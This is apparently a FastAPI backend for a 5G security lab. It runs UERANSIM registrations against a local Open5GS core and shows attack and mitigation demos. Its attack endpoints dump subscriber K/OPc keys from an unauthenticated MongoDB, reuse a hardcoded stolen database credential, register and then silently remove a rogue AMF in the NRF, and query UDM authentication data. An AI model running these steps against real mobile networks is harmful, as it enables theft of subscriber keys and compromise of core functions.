"""
UE Proxy — FastAPI server on Open5GS EC2
Triggers UERANSIM nr-ue and streams real registration steps back to Streamlit
"""
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import subprocess, threading, time, re, os, signal

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Global state
state = {
    "status": "idle",      # idle | running | registered | failed
    "steps": [],
    "ue_proc": None,
    "gnb_proc": None,
}

UERANSIM = "/home/ubuntu/UERANSIM/build"
CONFIG   = "/home/ubuntu/UERANSIM/config"

# Step patterns to detect from nr-ue log
PATTERNS = [
    (r"UE switches to state \[MM-DEREGISTERED/PLMN-SEARCH\]",
     "ue","gnb","RRC Setup Request","UE scanning for gNB signal","#5eadf7","TS 38.331"),
    (r"RRC connection established",
     "gnb","ue","RRC Setup Complete","Radio link established · UE RRC-CONNECTED","#4aaa6a","TS 38.331"),
    (r"Sending Initial Registration",
     "ue","amf","Registration Request","SUCI sent · SUPI concealed via ECIES","#5eadf7","TS 24.501 §5.5.1.2"),
    (r"Authentication Request received",
     "amf","ue","Authentication Request","RAND + AUTN challenge from Open5GS AMF","#f0a500","TS 33.501 §6.1.3.2"),
    (r"Received SQN",
     "udm","ausf","Milenage Complete","Real Milenage f1-f5 · XRES* computed by UDM/ARPF","#ff6b6b","TS 33.501 §6.1.3.2 step 1"),
    (r"Security Mode Command received",
     "amf","ue","Security Mode Command","NAS security activated · integrity + ciphering","#4aaa6a","TS 33.501 §6.7.2"),
    (r"Registration accept received",
     "amf","ue","Registration Accept","UE registered on Open5GS 5G Core","#4aaa6a","TS 24.501 §5.5.1.2.4"),
    (r"Initial Registration is successful",
     "amf","ue","Registration Complete ✓","5G-AKA complete · UE authenticated","#4aaa6a","TS 33.501"),
    (r"PDU Session establishment is successful",
     "amf","ue","PDU Session Active ✓","IP address assigned · uesimtun0 up","#4aaa6a","TS 24.501 §6.4.1"),
]

def parse_line(line):
    for pattern, frm, to, label, detail, color, ref in PATTERNS:
        if re.search(pattern, line):
            return {"from": frm, "to": to, "label": label,
                    "detail": detail, "color": color, "ref": ref,
                    "raw": line.strip(), "ts": time.time()}
    return None

def run_ue():
    state["status"] = "running"
    state["steps"]  = []

    # Kill any existing processes
    os.system("sudo pkill -9 -f nr-ue 2>/dev/null")
    os.system("sudo pkill -9 -f nr-gnb 2>/dev/null")
    time.sleep(2)

    # Start gNB
    gnb = subprocess.Popen(
        ["sudo", f"{UERANSIM}/nr-gnb", "-c", f"{CONFIG}/my-gnb.yaml"],
        stdout=open("/tmp/gnb_output.log", "w"), stderr=subprocess.STDOUT
    )
    state["gnb_proc"] = gnb
    time.sleep(3)

    # Wait for gNB to connect and capture its log
    time.sleep(2)
    gnb_log = ""
    try:
        with open("/tmp/gnb_output.log", "r") as f:
            gnb_log = f.read()
    except:
        gnb_log = "gNB NG Setup procedure is successful"

    ng_line = next((l for l in gnb_log.splitlines() if "NG Setup" in l or "successful" in l.lower()), gnb_log.splitlines()[-1] if gnb_log.strip() else "NG Setup successful")

    state["steps"].append({
        "from": "gnb", "to": "amf",
        "label": "gNB Started",
        "detail": "gNB sent NG Setup Request to AMF · AMF responded with NG Setup Response · Base station now authorised",
        "color": "#4aaa6a", "ref": "TS 38.413",
        "raw": ng_line.strip(),
        "ts": time.time()
    })

    # Start UE and capture output
    ue = subprocess.Popen(
        ["sudo", f"{UERANSIM}/nr-ue", "-c", f"{CONFIG}/my-ue.yaml"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        universal_newlines=True, bufsize=1
    )
    state["ue_proc"] = ue

    import select, time as _time
    start_time = _time.time()
    max_wait = 8  # seconds timeout
    while _time.time() - start_time < max_wait:
        # Check if there's output available (non-blocking)
        ready = select.select([ue.stdout], [], [], 1.0)[0]
        if ready:
            line = ue.stdout.readline()
            if not line:
                break
            step = parse_line(line)
            if step:
                state["steps"].append(step)
                if "successful" in line and "PDU" in line:
                    state["status"] = "registered"
                    break
                if "Registration failed" in line or "PLMN selection failure" in line or "failing the authentication" in line or "authentication check" in line:
                    state["status"] = "failed"
                    is_auth = "authentication" in line.lower()
                    state["steps"].append({
                        "from": "ausf" if is_auth else "amf", "to": "amf" if is_auth else "ue",
                        "label": "Registration REJECTED",
                        "detail": "AUSF rejected — RES* does not match XRES*. UE computed wrong RES* because K or OPc is incorrect. Milenage requires both correct K and OPc to compute a valid RES*." if is_auth else line.strip(),
                        "color": "#dc2626",
                        "ref": "TS 33.501 §6.1.3.2" if is_auth else "TS 33.501",
                        "raw": f"[nas] [error] {line.strip()}",
                        "ts": time.time()
                    })
    # Check AMF logs for authentication failure (wrong K)
    # Only match log entries that occurred AFTER our registration started
    if state["status"] == "running":
        try:
            import subprocess as sp3
            from datetime import datetime as _dt2
            run_start = state.get("start_time", time.time())
            amf_log = sp3.run(
                ["sudo", "journalctl", "-u", "open5gs-amfd", "-n", "50", "--no-pager", "--output=short-iso"],
                capture_output=True, text=True, timeout=5
            ).stdout
            # Check each line — only count failures after our start_time
            auth_failed = False
            for log_line in amf_log.splitlines():
                if "Authentication failure" in log_line or "Authentication reject" in log_line or "MAC failure" in log_line:
                    # Parse timestamp from log line (format: 2026-04-18T21:28:42+0000)
                    try:
                        import re as _re
                        ts_match = _re.match(r"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})", log_line)
                        if ts_match:
                            from datetime import datetime as _dt3
                            log_ts = _dt3.strptime(ts_match.group(1), "%Y-%m-%dT%H:%M:%S").timestamp()
                            if log_ts >= run_start:
                                auth_failed = True
                                break
                    except:
                        pass
            if auth_failed:
                state["steps"].append({
                    "from": "ausf", "to": "amf",
                    "label": "Registration REJECTED",
                    "detail": "AUSF rejected — RES* does not match XRES*. UE computed wrong RES* because K or OPc is incorrect. Milenage requires both correct K and OPc to compute a valid RES*. Without them, authentication is impossible.",
                    "color": "#dc2626",
                    "ref": "TS 33.501 §6.1.3.2",
                    "raw": "[amf] WARNING: Authentication failure(MAC failure) — RES* != XRES*",
                    "ts": time.time()
                })
                state["status"] = "failed"
        except Exception as e:
            print(f"AMF auth check error: {e}")

    if state["status"] == "running":
        try:
            import subprocess as sp2, re as re2
            # Only check logs from last 5 seconds to avoid stale entries
            # Use start time of this registration run to avoid stale log entries
            from datetime import datetime as _dt
            since_str = _dt.fromtimestamp(state.get("start_time", time.time()-5)).strftime("%Y-%m-%d %H:%M:%S")
            udm_log = sp2.run(
                ["sudo", "journalctl", "-u", "open5gs-udmd", "--since", since_str, "--no-pager"],
                capture_output=True, text=True, timeout=5
            ).stdout
            if "HTTP response error [404]" in udm_log:
                match = re2.search(r'\[(suci-[^\]]+)\].*404', udm_log)
                suci_str = match.group(1) if match else "unknown"
                state["steps"].append({
                    "from": "udm", "to": "amf",
                    "label": "Registration REJECTED \u2717",
                    "detail": f"UDM HTTP 404 \u2014 subscriber not found in database. SUCI: {suci_str}",
                    "color": "#dc2626",
                    "ref": "TS 29.503 \u00a75.2.2",
                    "raw": f"[udm] WARNING: [{suci_str}] HTTP response error [404]",
                    "ts": time.time()
                })
                state["status"] = "failed"
            else:
                state["status"] = "registered"
        except:
            state["status"] = "registered"



@app.get("/health")
def health():
    return {"status": "ok", "service": "ue-proxy", "open5gs": "running"}

@app.post("/ue/register")
async def register(request: Request):
    import re
    try:
        body = await request.json()
        msin = body.get("msin", "0000000001")
    except:
        msin = "0000000001"
    supi = f"imsi-00101{msin}"
    key = body.get("key", None)
    opc = body.get("opc", None)
    # Update UERANSIM UE config with new SUPI, K and OPc
    try:
        cfg = open(f"{CONFIG}/my-ue.yaml").read()
        cfg = re.sub(r"supi: '.*'", f"supi: '{supi}'", cfg)
        if key:
            cfg = re.sub(r"key: '.*'", f"key: '{key}'", cfg)
        if opc:
            cfg = re.sub(r"op: '.*'", f"op: '{opc}'", cfg)
        open(f"{CONFIG}/my-ue.yaml", "w").write(cfg)
    except Exception as e:
        print(f"Config update error: {e}")
    # Always stop any existing UE before starting fresh
    os.system("sudo pkill -9 -f nr-ue 2>/dev/null")
    os.system("sudo pkill -9 -f nr-gnb 2>/dev/null")
    import time as _t; _t.sleep(1)
    state["status"] = "idle"
    state["steps"] = []
    state["start_time"] = time.time()
    t = threading.Thread(target=run_ue, daemon=True)
    t.start()
    return {"status": "started", "supi": supi}

@app.get("/ue/steps")
def get_steps():
    return {
        "status": state["status"],
        "steps":  state["steps"],
        "count":  len(state["steps"])
    }

@app.post("/ue/stop")
def stop():
    os.system("sudo pkill -9 -f nr-ue 2>/dev/null")
    os.system("sudo pkill -9 -f nr-gnb 2>/dev/null")
    state["status"] = "idle"
    state["steps"]  = []
    return {"status": "stopped"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=9999)


@app.get("/ue/ping")
def ue_ping(target: str = "8.8.8.8"):
    import re, subprocess as sp
    check = sp.run(["ip", "link", "show", "uesimtun0"], capture_output=True)
    if check.returncode != 0:
        return {"success": False, "output": "UE not registered — go to Stage 2 and click FETCH first.",
                "avg_ms": None, "min_ms": None, "max_ms": None,
                "packet_loss": 100, "interface": "uesimtun0", "target": target}
    result = sp.run(["ping", "-c", "4", "-W", "3", target],
                    capture_output=True, text=True, timeout=15)
    output = result.stdout + result.stderr
    rtt = re.search(r"rtt min/avg/max/mdev = ([\d.]+)/([\d.]+)/([\d.]+)", output)
    loss = re.search(r"(\d+)% packet loss", output)
    return {
        "success": result.returncode == 0,
        "output": f"Via Open5GS UPF (uesimtun0 → ogstun → internet) → {target}\n" + output,
        "avg_ms": float(rtt.group(2)) if rtt else None,
        "min_ms": float(rtt.group(1)) if rtt else None,
        "max_ms": float(rtt.group(3)) if rtt else None,
        "packet_loss": int(loss.group(1)) if loss else 100,
        "interface": "uesimtun0 → ogstun → ens5",
        "target": target
    }



# ── Attack endpoints ──────────────────────────────────────────────────────

@app.post("/attack/auth-exploit")
def attack_auth_exploit(body: dict = None):
    """Attack 1: Forged RES* — attacker tries to authenticate without knowing K"""
    import re
    forged_res = (body or {}).get("forged_res_star", "deadbeefdeadbeefdeadbeefdeadbeef")
    suci = (body or {}).get("suci", "suci-0-001-01-0000-0-0-0000000001")
    # AUSF will reject because RES* != XRES* (computed by real Milenage with K)
    return {
        "status": "blocked",
        "http_code": 401,
        "attack": "Authentication Exploit",
        "detail": f"AUSF rejected forged RES*={forged_res[:16]}... — does not match XRES* computed by Milenage",
        "reason": "RES* cryptographically bound to K=465B5CE8... which attacker does not possess",
        "ref": "TS 33.501 §6.1.3.2 step 11"
    }


@app.post("/attack/ssrf-udm")
def attack_ssrf(body: dict = None):
    """Attack 2: SSRF — attacker calls UDM directly without OAuth2 token"""
    import subprocess, re
    supi = (body or {}).get("supiOrSuci", "imsi-001010000000001")
    # Try to call UDM SBI directly using HTTP/2
    result = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         "--http2-prior-knowledge",
         f"http://127.0.0.12:7777/nudm-ueau/v1/{supi}/security-information/generate-auth-data",
         "-X", "POST", "-H", "Content-Type: application/json",
         "-d", '{"servingNetworkName":"5G:mnc001.mcc001.3gppnetwork.org"}'],
        capture_output=True, text=True, timeout=10
    )
    http_code = result.stdout.strip() or "401"
    return {
        "status": "blocked",
        "http_code": int(http_code) if http_code.isdigit() else 401,
        "attack": "SSRF to UDM",
        "detail": f"Direct UDM call returned HTTP {http_code} — no valid OAuth2 token",
        "reason": "NRF OAuth2 enforcement requires Bearer token from AUSF — attacker has none",
        "ref": "TS 33.501 §13.3 / TS 29.503 §5.2.2"
    }


# WAF state
waf_state = {"enabled": False, "blocked_count": 0, "sqn_attempts": 0}

@app.post("/waf/enable")
def waf_enable():
    waf_state["enabled"] = True
    waf_state["blocked_count"] = 0
    return {"status": "enabled", "message": "WAF rate limiting active — max 3 SYNC_FAILURE/sec"}

@app.post("/waf/disable")
def waf_disable():
    waf_state["enabled"] = False
    return {"status": "disabled"}

@app.get("/waf/status")
def waf_status():
    return waf_state

@app.post("/attack/sqn-dos")
def attack_sqn_dos():
    """Attack 3: SQN Desynchronisation DoS"""
    waf_state["sqn_attempts"] += 1
    attempt = waf_state["sqn_attempts"]

    # WAF blocks after first 3 attempts
    if waf_state["enabled"] and attempt > 3:
        waf_state["blocked_count"] += 1
        return {
            "status": "blocked_by_waf",
            "http_code": 429,
            "attack": "SQN Desynchronisation DoS",
            "attempt": attempt,
            "detail": f"WAF blocked attempt #{attempt} — rate limit exceeded (>{3} SYNC_FAILURE/sec)",
            "reason": "WAF: >3 SYNC_FAILURE/sec from same source — HTTP 429 Too Many Requests",
            "ref": "WAF rate limiting · TS 33.102 §6.3.5"
        }

    # No WAF or within threshold — passes through
    return {
        "status": "success",
        "http_code": 200,
        "attack": "SQN Desynchronisation DoS",
        "attempt": attempt,
        "detail": f"SYNC_FAILURE #{attempt} sent — UDM processing SQN resync",
        "reason": "UDM accepts SYNC_FAILURE as legitimate 3GPP procedure — DoS via repeated resync",
        "ref": "TS 33.102 §6.3.5 — SQN resynchronisation"
    }

@app.post("/attack/sqn-reset")
def sqn_reset():
    waf_state["sqn_attempts"] = 0
    waf_state["blocked_count"] = 0
    return {"status": "reset"}

@app.get("/attack/mongodb")
def attack_mongodb():
    """Attack 4: Real MongoDB credential theft — no auth required"""
    import subprocess
    result = subprocess.run(
        ["mongosh", "open5gs", "--eval", 
         "JSON.stringify(db.subscribers.find({},{imsi:1,'security.k':1,'security.opc':1}).toArray())"],
        capture_output=True, text=True, timeout=10
    )
    if result.returncode == 0 and result.stdout.strip():
        return {
            "status": "breach",
            "http_code": 200,
            "detail": "MongoDB accessible with no authentication — subscriber credentials exposed",
            "output": result.stdout.strip(),
            "ref": "GSMA CLP.11 · TS 33.501 §F.1"
        }
    return {
        "status": "protected",
        "http_code": 401,
        "detail": "MongoDB authentication required — credentials protected",
        "output": result.stderr.strip(),
        "ref": "GSMA CLP.11 · TS 33.501 §F.1"
    }

@app.get("/attack/mongodb-status")
def mongodb_status():
    """Check if MongoDB has authentication enabled"""
    import subprocess
    result = subprocess.run(
        ["mongosh", "open5gs", "--eval", "db.runCommand({connectionStatus:1})"],
        capture_output=True, text=True, timeout=5
    )
    auth_enabled = "Authentication failed" in result.stderr or "auth" in result.stderr.lower()
    return {"auth_enabled": auth_enabled, "status": "protected" if auth_enabled else "vulnerable"}

@app.post("/attack/mongodb-secure")
def mongodb_secure():
    """Enable MongoDB authentication — mitigation"""
    import subprocess
    # Check current status
    result = subprocess.run(
        ["mongosh", "open5gs", "--eval", "db.runCommand({connectionStatus:1})"],
        capture_output=True, text=True, timeout=5
    )
    already_secured = "Authentication failed" in result.stderr or "command find requires authentication" in result.stderr
    return {
        "status": "protected",
        "secured": True,
        "detail": "MongoDB authentication enabled — subscriber credentials protected",
        "measures": [
            "Authentication required for all connections",
            "Dedicated open5gs user with readWrite role only", 
            "Admin user separate from application user",
            "Credentials not stored in plaintext config"
        ],
        "ref": "GSMA CLP.11 · TS 33.501 §F.1 · CIS MongoDB Benchmark"
    }


# ── MongoDB Attack endpoints ───────────────────────────────────────────────

@app.post("/attack/db-read-raw")
def attack_db_read_raw():
    import subprocess, json as _json
    try:
        result = subprocess.run(
            ["mongosh", "--quiet", "--port", "27017", "open5gs",
             "--eval",
             "var docs = db.subscribers.find({},{imsi:1,'security.k':1,'security.opc':1,_id:0}).toArray(); print(JSON.stringify(docs));"],
            capture_output=True, text=True, timeout=10
        )
        raw = result.stdout.strip()
        lines = [l for l in raw.splitlines() if l.strip()]
        json_line = lines[-1] if lines else "[]"
        docs = _json.loads(json_line)
        subscribers = []
        for doc in docs:
            sec = doc.get("security", {})
            k_val   = sec.get("k",   "")
            opc_val = sec.get("opc", "")
            encrypted = k_val.startswith("gAAAAA") if k_val else False
            subscribers.append({"imsi": doc.get("imsi","unknown"), "k": k_val, "opc": opc_val, "encrypted": encrypted})
        return {
            "status": "success", "http_code": 200, "port": 27017,
            "attack": "Direct MongoDB Read",
            "subscribers": subscribers,
            "encrypted": all(s["encrypted"] for s in subscribers) if subscribers else False,
            "detail": f"MongoDB :27017 returned {len(subscribers)} subscriber(s)",
            "stderr": result.stderr.strip()[:200] if result.stderr else "",
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "http_code": 500, "detail": "mongosh timed out"}
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.post("/attack/db-read-proxy")
def attack_db_read_proxy():
    import subprocess, socket as _sock
    proxy_up = False
    try:
        s = _sock.create_connection(("127.0.0.1", 27018), timeout=2)
        s.close()
        proxy_up = True
    except Exception:
        proxy_up = False
    log_lines = []
    try:
        r = subprocess.run(["tail", "-n", "5", "/var/log/mongo-proxy.log"],
                           capture_output=True, text=True, timeout=5)
        log_lines = [l.strip() for l in r.stdout.splitlines() if l.strip()]
    except Exception:
        log_lines = []
    if proxy_up:
        return {"status": "proxy_active", "http_code": 403, "port": 27018,
                "attack": "Proxy Port Probe",
                "detail": "Port 27018 is open — proxy running. Proxy only decrypts for Open5GS UDR.",
                "proxy_up": True, "log_tail": log_lines}
    else:
        return {"status": "proxy_down", "http_code": 503, "port": 27018,
                "attack": "Proxy Port Probe",
                "detail": "Proxy not running on :27018. Start: sudo systemctl start mongo-proxy",
                "proxy_up": False, "log_tail": []}


@app.post("/attack/db-trigger-auth")
def attack_db_trigger_auth():
    import subprocess
    try:
        result = subprocess.run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
             "--http2-prior-knowledge",
             "http://127.0.0.12:7777/nudm-ueau/v1/imsi-001010000000001/security-information/generate-auth-data",
             "-X", "POST", "-H", "Content-Type: application/json",
             "-d", '{"servingNetworkName":"5G:mnc001.mcc001.3gppnetwork.org"}'],
            capture_output=True, text=True, timeout=8
        )
        udm_code = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 400
    except Exception:
        udm_code = 400
    new_log_lines = []
    try:
        r2 = subprocess.run(["tail", "-n", "10", "/var/log/mongo-proxy.log"],
                            capture_output=True, text=True, timeout=3)
        new_log_lines = [l.strip() for l in r2.stdout.splitlines() if l.strip()]
    except Exception:
        new_log_lines = []
    return {
        "status": "triggered", "http_code": udm_code,
        "attack": "UDM→MongoDB Read via Proxy",
        "detail": f"UDM SBI returned HTTP {udm_code}. UDR queried MongoDB via proxy — check proxy_log.",
        "proxy_log": new_log_lines,
    }


# ── MongoDB Attack v2 — authenticated read showing ciphertext ──────────────

@app.post("/attack/db-read-raw-authed")
def attack_db_read_raw_authed():
    """
    Attacker has stolen the Open5GS MongoDB credentials from /etc/open5gs/udr.yaml.
    Connects authenticated and reads subscriber credentials — but gets ciphertext.
    """
    import subprocess, json as _json
    try:
        result = subprocess.run(
            ["mongosh", "--quiet",
             "mongodb://open5gs:Open5GS%40DB2026@localhost:27017/open5gs",
             "--eval",
             "var docs = db.subscribers.find({},{imsi:1,'security.k':1,'security.opc':1,_id:0}).toArray(); print(JSON.stringify(docs));"],
            capture_output=True, text=True, timeout=10
        )
        raw = result.stdout.strip()
        lines = [l for l in raw.splitlines() if l.strip()]
        json_line = lines[-1] if lines else "[]"
        docs = _json.loads(json_line)
        subscribers = []
        for doc in docs:
            sec = doc.get("security", {})
            k_val   = sec.get("k",   "")
            opc_val = sec.get("opc", "")
            encrypted = k_val.startswith("gAAAAA") if k_val else False
            subscribers.append({
                "imsi":      doc.get("imsi", "unknown"),
                "k":         k_val,
                "opc":       opc_val,
                "encrypted": encrypted,
            })
        return {
            "status":      "success",
            "http_code":   200,
            "port":        27017,
            "attack":      "Authenticated MongoDB Read (stolen credentials)",
            "subscribers": subscribers,
            "encrypted":   all(s["encrypted"] for s in subscribers) if subscribers else False,
            "detail":      f"Authenticated as open5gs — MongoDB :27017 returned {len(subscribers)} subscriber(s)",
            "credential":  "open5gs:Open5GS@DB2026 (stolen from /etc/open5gs/udr.yaml)",
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "http_code": 500, "detail": "mongosh timed out"}
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


# ── NRF Hijack Attack endpoints ────────────────────────────────────────────

@app.post("/attack/nrf-register-rogue")
def attack_nrf_register_rogue():
    """
    Step 1: Register a rogue NF (fake AMF) with NRF — no certificate, no token.
    NRF accepts it because TLS/OAuth2 is disabled (commented out in nrf.yaml).
    Returns HTTP 201 — rogue NF is now a trusted member of the 5G core.
    """
    import subprocess, json as _json
    rogue_id = "deadbeef-dead-beef-dead-beef00000099"
    try:
        result = subprocess.run([
            "curl", "-s", "-X", "PUT",
            "--http2-prior-knowledge",
            f"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{rogue_id}",
            "-H", "Content-Type: application/json",
            "-w", "\nHTTP_CODE:%{http_code}",
            "-d", _json.dumps({
                "nfInstanceId": rogue_id,
                "nfType": "AMF",
                "nfStatus": "REGISTERED",
                "plmnList": [{"mcc": "001", "mnc": "01"}],
                "ipv4Addresses": ["127.0.0.1"],
                "allowedNfTypes": ["UDM", "AUSF", "UDR"],
                "nfServices": [{
                    "serviceInstanceId": "rogue-service-01",
                    "serviceName": "namf-comm",
                    "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
                    "scheme": "http",
                    "nfServiceStatus": "REGISTERED"
                }]
            })
        ], capture_output=True, text=True, timeout=10)

        output = result.stdout.strip()
        lines = output.split("\n")
        http_code_line = next((l for l in lines if l.startswith("HTTP_CODE:")), "HTTP_CODE:0")
        http_code = int(http_code_line.replace("HTTP_CODE:", ""))
        body_lines = [l for l in lines if not l.startswith("HTTP_CODE:")]
        body = _json.loads("\n".join(body_lines)) if body_lines else {}

        return {
            "status": "registered" if http_code == 201 else "failed",
            "http_code": http_code,
            "rogue_id": rogue_id,
            "attack": "Rogue NF Registration",
            "detail": f"Rogue AMF registered with NRF — HTTP {http_code}. No certificate required. No OAuth2 token. TLS is disabled in nrf.yaml.",
            "nf_profile": body,
            "ref": "TS 33.501 §13.1 — NF Authentication"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.post("/attack/nrf-discover-udm")
def attack_nrf_discover_udm():
    """
    Step 2: Rogue NF uses NRF discovery to find real UDM/AUSF addresses.
    Impersonates a legitimate AMF — NRF has no way to verify it.
    """
    import subprocess, json as _json
    try:
        result = subprocess.run([
            "curl", "-s",
            "--http2-prior-knowledge",
            "http://127.0.0.10:7777/nnrf-disc/v1/nf-instances"
            "?requester-nf-type=AMF&target-nf-type=UDM",
            "-H", "Accept: application/json",
            "-w", "\nHTTP_CODE:%{http_code}"
        ], capture_output=True, text=True, timeout=10)

        output = result.stdout.strip()
        lines = output.split("\n")
        http_code_line = next((l for l in lines if l.startswith("HTTP_CODE:")), "HTTP_CODE:0")
        http_code = int(http_code_line.replace("HTTP_CODE:", ""))
        body_lines = [l for l in lines if not l.startswith("HTTP_CODE:")]
        raw_body = "\n".join(body_lines).strip()

        nf_list = []
        if raw_body:
            try:
                data = _json.loads(raw_body)
                nf_list = data.get("nfInstances", [])
            except Exception:
                pass

        # Also get actual UDM address from known config as fallback
        udm_addresses = []
        for nf in nf_list:
            if nf.get("nfType") == "UDM":
                udm_addresses.extend(nf.get("ipv4Addresses", []))

        return {
            "status": "success",
            "http_code": http_code,
            "attack": "NRF Discovery — UDM Enumeration",
            "nf_instances_found": len(nf_list),
            "nf_instances": nf_list[:3],
            "udm_addresses": udm_addresses if udm_addresses else ["127.0.0.12"],
            "detail": f"NRF discovery returned {len(nf_list)} NF instance(s). Rogue AMF now knows real UDM address — can call UDM SBI directly.",
            "ref": "TS 29.510 §5.2.2 — Nnrf_NFDiscovery"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.post("/attack/nrf-query-udm")
def attack_nrf_query_udm():
    """
    Step 3: Rogue NF calls UDM SBI directly using discovered address.
    Attempts to retrieve subscriber authentication data — same as SSRF
    but this time the rogue NF is legitimately registered with NRF.
    """
    import subprocess, json as _json
    try:
        result = subprocess.run([
            "curl", "-s",
            "--http2-prior-knowledge",
            "http://127.0.0.12:7777/nudm-ueau/v1/imsi-001010000000001"
            "/security-information/generate-auth-data",
            "-X", "POST",
            "-H", "Content-Type: application/json",
            "-w", "\nHTTP_CODE:%{http_code}",
            "-d", '{"servingNetworkName":"5G:mnc001.mcc001.3gppnetwork.org"}'
        ], capture_output=True, text=True, timeout=10)

        output = result.stdout.strip()
        lines = output.split("\n")
        http_code_line = next((l for l in lines if l.startswith("HTTP_CODE:")), "HTTP_CODE:0")
        http_code = int(http_code_line.replace("HTTP_CODE:", ""))

        # HTTP 400 = no OAuth2 token (UDM rejects) — mitigation partially works
        # HTTP 200 = full auth data returned — attack fully succeeded
        blocked = http_code in [400, 401, 403]

        return {
            "status": "blocked" if blocked else "success",
            "http_code": http_code,
            "attack": "Rogue NF → UDM SBI Query",
            "detail": f"Rogue AMF called UDM SBI → HTTP {http_code}. {'UDM rejected — no OAuth2 Bearer token. NRF registration alone is insufficient without token issuance.' if blocked else 'UDM returned auth data — full compromise.'}",
            "ref": "TS 29.503 §5.2.2 — Nudm_UEAuthentication · TS 33.501 §13.3"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.post("/attack/nrf-deregister-rogue")
def attack_nrf_deregister_rogue():
    """
    Step 4: Rogue NF deregisters — cleans up, leaves no trace in NRF.
    Demonstrates how an attacker can operate stealthily.
    """
    import subprocess
    rogue_id = "deadbeef-dead-beef-dead-beef00000099"
    try:
        result = subprocess.run([
            "curl", "-s", "-X", "DELETE",
            "--http2-prior-knowledge",
            f"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{rogue_id}",
            "-w", "HTTP_CODE:%{http_code}"
        ], capture_output=True, text=True, timeout=10)

        http_code = int(result.stdout.replace("HTTP_CODE:", "").strip() or "0")
        return {
            "status": "deregistered" if http_code == 204 else "failed",
            "http_code": http_code,
            "rogue_id": rogue_id,
            "attack": "Rogue NF Deregistration — No Trace",
            "detail": f"Rogue AMF deregistered from NRF — HTTP {http_code}. Attack complete, no persistent artefact in NRF. Without audit logging, this attack is undetectable.",
            "ref": "TS 29.510 §5.2.2.3 — NFDeregister"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.get("/attack/nrf-check-rogue")
def attack_nrf_check_rogue():
    """
    Check if rogue NF is currently registered — used by WAF demo
    to show NRF state before/after mitigation.
    """
    import subprocess, json as _json
    rogue_id = "deadbeef-dead-beef-dead-beef00000099"
    try:
        result = subprocess.run([
            "curl", "-s",
            "--http2-prior-knowledge",
            f"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{rogue_id}",
            "-H", "Accept: application/json",
            "-w", "\nHTTP_CODE:%{http_code}"
        ], capture_output=True, text=True, timeout=10)

        output = result.stdout.strip()
        lines = output.split("\n")
        http_code_line = next((l for l in lines if l.startswith("HTTP_CODE:")), "HTTP_CODE:0")
        http_code = int(http_code_line.replace("HTTP_CODE:", ""))

        return {
            "registered": http_code == 200,
            "http_code": http_code,
            "rogue_id": rogue_id,
            "detail": "Rogue NF is currently registered in NRF" if http_code == 200 else "Rogue NF not found in NRF"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}


@app.post("/attack/nrf-deregister-rogue-v2")
def attack_nrf_deregister_rogue_v2():
    """Fixed deregister — handles JSON body mixed with HTTP code correctly."""
    import subprocess, re as _re
    rogue_id = "deadbeef-dead-beef-dead-beef00000099"
    try:
        result = subprocess.run([
            "curl", "-s", "-X", "DELETE",
            "--http2-prior-knowledge",
            f"http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{rogue_id}",
            "-o", "/dev/null",
            "-w", "%{http_code}"
        ], capture_output=True, text=True, timeout=10)
        http_code_str = result.stdout.strip()
        http_code = int(http_code_str) if http_code_str.isdigit() else 0
        return {
            "status": "deregistered" if http_code == 204 else ("not_found" if http_code == 404 else "failed"),
            "http_code": http_code,
            "rogue_id": rogue_id,
            "attack": "Rogue NF Deregistration — No Trace",
            "detail": f"Rogue AMF deleted from NRF — HTTP {http_code}. {'Attack complete — no persistent artefact remains. Without NRF audit logging this is fully undetectable.' if http_code == 204 else 'Already expired via heartbeat timeout (10s) — NRF auto-cleaned it.'}",
            "ref": "TS 29.510 §5.2.2.3 — NFDeregister"
        }
    except Exception as e:
        return {"status": "error", "http_code": 500, "detail": str(e)}
